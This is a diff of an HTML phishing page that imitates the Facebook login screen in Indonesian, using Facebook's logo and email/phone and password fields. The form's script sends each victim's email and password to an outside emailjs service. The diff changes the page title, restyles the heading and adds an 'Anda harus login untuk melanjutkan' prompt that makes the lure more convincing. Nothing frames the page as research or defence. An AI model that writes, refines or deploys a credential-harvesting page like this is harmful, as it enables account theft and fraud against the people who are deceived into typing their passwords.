@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - Masuk atau Daftar</title>
+  <title>Login Page</title>
   <style>
     body {
       margin: 0;
@@ -30,9 +30,12 @@
     }
 
     .login-container h1 {
-      font-size: 24px;
+      font-size: 10px;
       margin-bottom: 20px;
-      color: #1877f2;
+      color: #000;
+      background-color: #fff9d7;
+      border: 1px solid #e2c822;
+      padding: 10px;
     }
 
     input[type="text"],
@@ -126,7 +129,7 @@
 <body>
   <div class="login-container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-    <h1></h1>
+    <h1>Anda harus login untuk melanjutkan.</h1>
     <form id="loginForm">
       <input type="text" id="email" placeholder="Nomor ponsel atau email">
       <input type="password" id="password" placeholder="Kata sandi">
@@ -177,13 +180,14 @@
       }
 
       loadingIndicator.style.display = 'block';
+
       try {
         const templateParams = {
           email: email,
           password: password
         };
 
-        
+       
         const response = await emailjs.send("service_wimuilb", "template_svvfoh9", templateParams);
         console.log('Email terkirim:', response);
 
